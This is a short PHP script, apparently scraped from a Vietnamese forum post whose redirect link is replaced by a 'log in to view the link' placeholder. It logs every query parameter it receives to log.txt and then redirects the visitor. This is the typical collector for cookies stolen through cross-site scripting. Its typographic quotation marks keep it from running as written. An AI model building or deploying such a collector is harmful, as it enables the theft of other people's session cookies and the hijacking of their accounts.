<?php
header (‘Location: Xin vui lòng đăng nhập hoặc đăng ký để xem liên kết ‘);
$handle = fopen(“log.txt”, “a”);
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>